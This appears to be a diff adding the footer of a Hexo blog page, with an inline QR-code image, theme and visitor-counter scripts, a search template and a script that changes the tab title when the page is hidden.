+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACL0lEQVR42u3aS46DQAxF0ex/0/QkMwTcZ1dawnVrFBF+h4Hlsv354HWc1vnfq/PP51zd7er+y5YMGTJeyzhuF38t/pQa7P5TypAhYwfG1YN5SE2DZvqxHt5ZhgwZMvBr3QfT2rUyZMiQ0WHUEkpylQwZMmTUNrG86sX/5R9i2V5chgwZL2SkL/efv3/S35AhQ8arGEe4CC890nmf731kyJAxmlFrQPLBC5IIrmoqyJAhYzaDl/VrwZcX1DpjZzJkyNiBkaZ9HFkLwaTkJ0OGjD0ZPNiRVI+fEyR/JODKkCFjEIMHR97mrB3hrVC0C5chQ8ZoRq30zx+ctirRVTJkyNiGUStydba1aWvz8rgMGTI2YPAyfRpeSWDlpbqHTawMGTKGMnh+1WHUqGmDQYYMGVMZtWEI3nrkSWQ6bHGZGsqQIWMcIy20rWp2/uL+MmTImMroj6J2vlYaXtH3liFDxlAGL9DXWpKrtrUPLUwZMmQMZdQGLDohNS20dQY1ZMiQMYnRCZqddkI6tPHwEWXIkLENg6d0tSSSDIpxgAwZMnZjdMazeNbJXzTevsqQIWMo4wgX3+L22wlBy1OGDBmjGbUuYdrgXDWomjYwZMiQMYlRC7K1ZkAtfUTJogwZMjZgpAV9fiQdbC0iZciQIaOdaaZzH2R7jKpxMmTI2JJRq8lzUrHBKUOGjA0YZBNbawPwsQmSbi4ot8mQIeOFjHTQgQfoYKgL363VyJQhQ8b7GH8JJiy6sQWXjgAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
